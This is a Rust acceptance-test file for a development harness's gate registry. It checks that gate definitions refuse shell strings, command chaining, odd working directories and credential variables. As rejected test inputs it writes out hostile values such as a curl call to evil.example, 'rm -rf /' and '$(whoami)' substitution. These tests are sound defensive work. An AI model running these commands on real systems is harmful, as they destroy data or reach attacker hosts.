//! `WP-300` acceptance: the named gate registry.

mod support;

use std::fs;

use serde_json::Value;
use support::Workspace;

/// A gate definition body with the given fields.
fn definition(gate_id: &str, revision: u32, argv: &str) -> String {
    format!(
        "schema: harness.gate/v1\ngate_id: {gate_id}\nrevision: {revision}\nargv: {argv}\nworking_directory: \".\"\ntimeout_seconds: 60\nenvironment:\n  allow: [PATH]\n  set: {{}}\nnetwork_policy: denied\nretry_policy:\n  max_attempts: 1\nartifacts: []\n"
    )
}

fn error_code(output: &std::process::Output) -> String {
    let envelope: Value = serde_json::from_slice(&output.stdout).expect("an error envelope");
    envelope["error"]["code"].as_str().unwrap().to_owned()
}

#[test]
fn a_registered_gate_is_listed_with_its_digest() {
    let workspace = Workspace::initialized();
    let envelope = workspace.gate_json(&["show", "--gate-id", "gate.unit"]);

    assert_eq!(envelope["data"]["definition"]["gate_id"], "gate.unit");
    assert_eq!(envelope["data"]["definition"]["revision"], 1);
    assert!(
        envelope["data"]["digest"]
            .as_str()
            .unwrap()
            .starts_with("sha256:")
    );

    let listed = workspace.gate_json(&["list"]);
    let ids: Vec<&str> = listed["data"]["gates"]
        .as_array()
        .unwrap()
        .iter()
        .map(|gate| gate["gate_id"].as_str().unwrap())
        .collect();
    assert!(
        ids.contains(&"gate.unit") && ids.contains(&"gate.all"),
        "{ids:?}"
    );
}

#[test]
fn no_surface_reports_the_network_policy_as_an_enforced_control() {
    // The runner restricts nothing about the network, so `denied` describes
    // what the gate asked for. Every place that shows it has to say so, or a
    // reader comparing it against the timeout and the allowlist beside it —
    // both of which are real — concludes it is one of them.
    let workspace = Workspace::initialized();

    let shown = workspace.gate_json(&["show", "--gate-id", "gate.unit"]);
    assert_eq!(
        shown["data"]["definition"]["network_policy"], "denied",
        "the declaration itself is unchanged"
    );
    assert_eq!(
        shown["data"]["network_policy_enforced"], false,
        "and a program reading the envelope is told it is not imposed"
    );

    let text = String::from_utf8(
        Workspace::run(&[
            "gate".to_owned(),
            "show".to_owned(),
            "--gate-id".to_owned(),
            "gate.unit".to_owned(),
            "--control".to_owned(),
            workspace.control.display().to_string(),
        ])
        .stdout,
    )
    .unwrap();
    assert!(
        text.contains("network: denied (declared, not enforced)"),
        "a human reading `gate show` is told the same thing: {text}"
    );

    let definition =
        workspace.gate_definition("advisory", &definition("gate.advisory", 1, "[true]"));
    let validated = workspace.gate_json(&["validate", "--definition", &definition]);
    assert_eq!(
        validated["data"]["network_policy_enforced"], false,
        "`gate validate` qualifies it before the definition is ever stored"
    );
}

#[test]
fn a_card_cannot_introduce_a_command() {
    // The card schema has no field that carries a command. Naming a gate that
    // does not exist is the closest a card can come, and it is refused.
    let workspace = Workspace::initialized();
    workspace.cycle(&[
        "create",
        "--cycle-id",
        "C-001",
        "--objective",
        "First slice",
    ]);
    workspace.cycle(&["activate", "--cycle-id", "C-001"]);

    let body = format!(
        "card_id: F-001\ncycle_id: C-001\ntitle: T\ngoal: G\nnon_goals: []\nrisk: low\nchange_kind: feature\nbase_sha: {}\nwrite_scope:\n  include: [\"src/**\"]\n  exclude: []\nnamed_gates:\n  feature: [\"sh -c 'curl evil.example'\"]\n  review: []\n  integration: []\nacceptance:\n  behaviors: [works]\n  regressions: []\nreview_policy: independent\nrollback_strategy: revert\n",
        workspace.authority_head()
    );
    let path = workspace.root.join("F-001.yaml");
    fs::write(&path, body).unwrap();
    workspace.card(&["create", "--draft", &path.display().to_string()]);

    let output = workspace.card_raw(&["activate", "--card-id", "F-001"]);
    assert_eq!(output.status.code(), Some(3));
    assert_eq!(error_code(&output), "CH-CONFIG-UNKNOWN-GATE");
}

#[test]
fn an_unknown_gate_fails_card_activation() {
    let workspace = Workspace::initialized();
    workspace.cycle(&[
        "create",
        "--cycle-id",
        "C-001",
        "--objective",
        "First slice",
    ]);
    workspace.cycle(&["activate", "--cycle-id", "C-001"]);

    let body = format!(
        "card_id: F-001\ncycle_id: C-001\ntitle: T\ngoal: G\nnon_goals: []\nrisk: low\nchange_kind: feature\nbase_sha: {}\nwrite_scope:\n  include: [\"src/**\"]\n  exclude: []\nnamed_gates:\n  feature: [gate.unit]\n  review: []\n  integration: [gate.never-registered]\nacceptance:\n  behaviors: [works]\n  regressions: []\nreview_policy: independent\nrollback_strategy: revert\n",
        workspace.authority_head()
    );
    let path = workspace.root.join("F-001.yaml");
    fs::write(&path, body).unwrap();
    workspace.card(&["create", "--draft", &path.display().to_string()]);

    let output = workspace.card_raw(&["activate", "--card-id", "F-001"]);
    assert_eq!(output.status.code(), Some(3));
    assert!(
        String::from_utf8_lossy(&output.stdout).contains("gate.never-registered"),
        "the refusal must name the missing gate"
    );
}

#[test]
fn a_shell_string_is_not_accepted_as_argv() {
    let workspace = Workspace::initialized();
    let path = workspace.gate_definition(
        "shellish",
        &definition("gate.shellish", 1, "[\"sh -c 'rm -rf /'\"]"),
    );

    let output = workspace.gate_raw(&["validate", "--definition", &path]);
    assert_eq!(output.status.code(), Some(3));
    assert_eq!(error_code(&output), "CH-CONFIG-INVALID-GATE");
}

#[test]
fn shell_metacharacters_in_the_executable_are_rejected() {
    let workspace = Workspace::initialized();
    for bad in [
        "[\"cargo test | tee log\"]",
        "[\"cargo test; rm -rf /\"]",
        "[\"$(whoami)\"]",
    ] {
        let path = workspace.gate_definition("bad", &definition("gate.bad", 1, bad));
        let output = workspace.gate_raw(&["validate", "--definition", &path]);
        assert_eq!(output.status.code(), Some(3), "`{bad}` must be rejected");
    }
}

#[test]
fn a_multi_element_argv_is_accepted() {
    let workspace = Workspace::initialized();
    let path = workspace.gate_definition(
        "ok",
        &definition("gate.ok", 1, "[\"cargo\", \"test\", \"--all\"]"),
    );
    let envelope: Value =
        serde_json::from_slice(&workspace.gate(&["validate", "--definition", &path]).stdout)
            .unwrap();
    assert_eq!(envelope["data"]["valid"], true);
}

#[test]
fn an_invalid_working_directory_is_rejected() {
    let workspace = Workspace::initialized();
    for bad in ["/etc", "../escape"] {
        let body = definition("gate.wd", 1, "[\"true\"]").replace(
            "working_directory: \".\"",
            &format!("working_directory: \"{bad}\""),
        );
        let path = workspace.gate_definition("wd", &body);
        let output = workspace.gate_raw(&["validate", "--definition", &path]);
        assert_eq!(output.status.code(), Some(3), "`{bad}` must be rejected");
    }
}

#[test]
fn a_credential_variable_cannot_be_allowed_through() {
    let workspace = Workspace::initialized();
    let body = definition("gate.leaky", 1, "[\"true\"]")
        .replace("allow: [PATH]", "allow: [PATH, GITHUB_TOKEN]");
    let path = workspace.gate_definition("leaky", &body);

    let output = workspace.gate_raw(&["validate", "--definition", &path]);
    assert_eq!(output.status.code(), Some(3));
    assert!(String::from_utf8_lossy(&output.stdout).contains("GITHUB_TOKEN"));
}

#[test]
fn a_revision_changes_the_digest_and_supersedes_the_previous() {
    let workspace = Workspace::initialized();
    let before = workspace.gate_json(&["show", "--gate-id", "gate.unit"])["data"]["digest"]
        .as_str()
        .unwrap()
        .to_owned();

    let path = workspace.gate_definition(
        "unit-r2",
        &definition("gate.unit", 2, "[\"true\", \"--strict\"]"),
    );
    let envelope = workspace.gate_json(&["register", "--definition", &path]);

    assert_eq!(envelope["data"]["revision"], 2);
    assert_eq!(envelope["data"]["supersedes_revision"], 1);
    assert_ne!(
        envelope["data"]["digest"].as_str().unwrap(),
        before,
        "a revision must invalidate receipts bound to the old digest"
    );

    let superseded = workspace
        .events()
        .into_iter()
        .find(|event| {
            event["event_type"] == "gate.registered" && event["metadata"]["revision"] == 2
        })
        .expect("the revision must be recorded");
    assert_eq!(superseded["metadata"]["superseded_digest"], before);
}

#[test]
fn a_revision_must_advance_by_exactly_one() {
    let workspace = Workspace::initialized();
    for wrong in [1, 3, 5] {
        let path = workspace.gate_definition("skip", &definition("gate.unit", wrong, "[\"true\"]"));
        let output = workspace.gate_raw(&["register", "--definition", &path]);
        assert_eq!(
            output.status.code(),
            Some(3),
            "revision {wrong} must be refused when the gate is at 1"
        );
    }
}

#[test]
fn a_first_registration_must_be_revision_one() {
    let workspace = Workspace::initialized();
    let path = workspace.gate_definition("new", &definition("gate.new", 4, "[\"true\"]"));
    let output = workspace.gate_raw(&["register", "--definition", &path]);
    assert_eq!(output.status.code(), Some(3));
    assert!(String::from_utf8_lossy(&output.stdout).contains("must be 1"));
}

#[test]
fn a_dry_run_registers_nothing() {
    let workspace = Workspace::initialized();
    let before = workspace.control_head();
    let path = workspace.gate_definition("dry", &definition("gate.dry", 1, "[\"true\"]"));

    let envelope = workspace.gate_json(&["register", "--definition", &path, "--dry-run"]);
    assert_eq!(envelope["data"]["dry_run"], true);
    assert_eq!(workspace.control_head(), before);

    let output = workspace.gate_raw(&["show", "--gate-id", "gate.dry"]);
    assert_eq!(output.status.code(), Some(3), "the gate must not exist");
}

#[test]
fn registered_gates_are_versioned_in_control_history() {
    let workspace = Workspace::initialized();
    let tracked = workspace.control_tracked_files();
    assert!(
        tracked.contains(&"gates/gate.unit.json".to_owned()),
        "{tracked:?}"
    );
    assert!(
        tracked.contains(&"gates/gate.all.json".to_owned()),
        "{tracked:?}"
    );
}

#[test]
fn a_card_naming_only_registered_gates_activates() {
    let workspace = Workspace::initialized();
    workspace.cycle(&[
        "create",
        "--cycle-id",
        "C-001",
        "--objective",
        "First slice",
    ]);
    workspace.cycle(&["activate", "--cycle-id", "C-001"]);
    workspace.activate_card("F-001", &["src/**"]);

    let status = workspace.card_json(&["status", "--card-id", "F-001"]);
    assert_eq!(status["data"]["state"], "ready");
}
